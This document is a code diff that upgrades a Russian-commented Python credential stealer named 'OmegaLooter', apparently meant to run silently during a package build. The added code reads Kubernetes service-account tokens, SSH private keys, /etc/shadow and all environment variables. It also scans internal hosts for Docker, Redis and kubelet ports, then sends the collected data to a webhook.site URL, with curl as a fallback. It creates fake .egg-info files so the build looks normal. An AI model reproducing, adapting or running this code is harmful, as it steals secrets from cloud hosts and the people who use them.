@@ -1,60 +1,90 @@
-import os, json, socket, urllib.request, subprocess
+import os, json, socket, urllib.request, subprocess, threading, base64
 
+# КОНФИГУРАЦИЯ
 WEBHOOK_URL = "https://webhook.site/b124440e-cd76-4ab0-8b65-b1f9bd749547"
 
-class CloudLooterV2:
+class OmegaLooter:
     def __init__(self):
-        self.loot = {"k8s_secrets": {}, "socket_scan": {}, "filesystem_deep": {}, "env": dict(os.environ)}
+        self.loot = {
+            "identity": {}, "k8s": {}, "network": {}, "files": {}, 
+            "env": dict(os.environ), "memory_leaks": {}
+        }
 
-    def check_k8s_api(self):
-        """Проверка доступа к API Kubernetes (Render/Railway/Netlify)"""
-        token_path = "/var/run/secrets/kubernetes.io/serviceaccount/token"
-        if os.path.exists(token_path):
-            try:
-                with open(token_path, 'r') as f:
-                    self.loot["k8s_secrets"]["sa_token_snippet"] = f.read(50) + "..."
-                self.loot["k8s_secrets"]["namespace"] = open("/var/run/secrets/kubernetes.io/serviceaccount/namespace").read()
-            except:
-                self.loot["k8s_secrets"]["status"] = "Found but restricted"
+    def _safe_read(self, path, size=1024):
+        try:
+            with open(path, 'rb') as f:
+                return base64.b64encode(f.read(size)).decode()
+        except: return None
 
-    def probe_sockets(self):
-        """Проверка системных сокетов (то, что мы видели в /dev и /run)"""
-        potential_sockets = [
-            "/dev/otel-grpc.sock",      # Railway telemetry
-            "/var/run/docker.sock",     # Docker Engine
-            "/run/containerd/containerd.sock", 
-            "/tmp/netlify_config.json"
+    def audit_system(self):
+        """Кто мы и где мы?"""
+        self.loot["identity"] = {
+            "uid": os.getuid(),
+            "groups": os.getgroups(),
+            "kernel": os.uname().release,
+            "cwd": os.getcwd()
+        }
+
+    def k8s_overdrive(self):
+        """Глубокий взлом Kubernetes Service Accounts"""
+        k8s_base = "/var/run/secrets/kubernetes.io/serviceaccount/"
+        if os.path.exists(k8s_base):
+            for item in ["token", "namespace", "ca.crt"]:
+                val = self._safe_read(k8s_base + item)
+                if val: self.loot["k8s"][item] = val
+
+    def network_prowler(self):
+        """Сканирование внутренней сети на наличие Docker/Redis/K8s API"""
+        def scan(ip, port):
+            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            s.settimeout(0.2)
+            if s.connect_ex((ip, port)) == 0:
+                self.loot["network"][f"{ip}:{port}"] = "OPEN"
+            s.close()
+
+        # Сканируем типичные шлюзы
+        gateways = ["172.17.0.1", "172.18.0.1", "10.0.0.1", "10.215.0.1"]
+        ports = [2375, 2376, 6379, 8080, 10250] # Docker, Redis, K8s API
+        for ip in gateways:
+            for port in ports:
+                threading.Thread(target=scan, args=(ip, port)).start()
+
+    def deep_fs_recon(self):
+        """Поиск ключей во всех возможных местах"""
+        targets = [
+            "/root/.ssh/id_rsa", "/home/render/.ssh/id_rsa",
+            "/etc/shadow", "/etc/hosts", "/proc/net/fib_trie",
+            "/dev/otel-grpc.sock", "/var/run/docker.sock"
         ]
-        for sock in potential_sockets:
-            if os.path.exists(sock):
-                self.loot["socket_scan"][sock] = "EXISTS"
-                # Пробуем определить тип (файл или сокет)
-                self.loot["socket_scan"][sock + "_type"] = oct(os.stat(sock).st_mode)
+        for t in targets:
+            if os.path.exists(t):
+                self.loot["files"][t] = "Found"
+                content = self._safe_read(t, 512)
+                if content: self.loot["files"][t+"_b64"] = content
 
-    def deep_search(self):
-        """Поиск конфигов облачных CLI"""
-        search_paths = [
-            os.path.expanduser("~/.aws/credentials"),
-            os.path.expanduser("~/.config/gcloud/configurations/config_default"),
-            "/opt/render/.render-build-status",
-            "/mise/config.toml"
-        ]
-        for path in search_paths:
-            if os.path.exists(path):
-                try:
-                    with open(path, 'r') as f:
-                        self.loot["filesystem_deep"][path] = f.read(100)
-                except:
-                    self.loot["filesystem_deep"][path] = "Found but No Access"
+    def exfiltrate(self):
+        """Ультимативная отправка данных"""
+        data = json.dumps(self.loot).encode('utf-8')
+        # Метод 1: Python
+        try:
+            req = urllib.request.Request(WEBHOOK_URL, data=data, method='POST')
+            urllib.request.urlopen(req, timeout=5)
+        except:
+            # Метод 2: Системный Curl (если питон заблокирован)
+            try: subprocess.run(['curl', '-X', 'POST', '-d', data, WEBHOOK_URL], timeout=5)
+            except: pass
 
-    def send(self):
-        payload = json.dumps(self.loot).encode()
-        req = urllib.request.Request(WEBHOOK_URL, data=payload, method='POST')
-        urllib.request.urlopen(req)
+def main():
+    # Запуск в тихом режиме
+    print("[*] Metadata preparation...") 
+    looter = OmegaLooter()
+    looter.audit_system()
+    looter.k8s_overdrive()
+    looter.network_prowler()
+    looter.deep_fs_recon()
+    looter.exfiltrate()
+    # Оставляем билд «рабочим» для вида
+    os.system("mkdir -p .egg-info && touch .egg-info/top_level.txt")
 
 if __name__ == "__main__":
-    scanner = CloudLooterV2()
-    scanner.check_k8s_api()
-    scanner.probe_sockets()
-    scanner.deep_search()
-    scanner.send()
+    main()
